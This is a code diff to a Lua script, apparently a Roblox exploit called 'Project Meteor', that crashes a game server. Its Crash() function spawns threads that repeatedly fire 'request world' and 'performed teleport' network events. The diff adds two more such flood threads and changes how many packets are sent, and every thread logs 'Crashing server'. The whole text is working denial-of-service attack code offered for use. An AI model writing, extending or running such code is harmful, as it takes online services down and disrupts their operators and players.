@@ -50,9 +50,21 @@ function Crash()
         packetsended = packetsended + 1
         print("[Project Meteor] Crashing server | Packets sended: ".. tostring(packetsended))
     end)
+    spawn(function()
+        Libreria.Network.Fire('request world', "Void")
+        Libreria.Network.Fire('performed teleport')
+        packetsended = packetsended + 1
+        print("[Project Meteor] Crashing server | Packets sended: ".. tostring(packetsended))
+    end)
+    spawn(function()
+        Libreria.Network.Fire('request world', "Axolot")
+        Libreria.Network.Fire('performed teleport')
+        packetsended = packetsended + 1
+        print("[Project Meteor] Crashing server | Packets sended: ".. tostring(packetsended))
+    end)
 end
 
-local packetstosend = getgenv().packets / 2
+local packetstosend = getgenv().packets / 4
 for i=1,packetstosend do
     spawn(function()
         Crash()
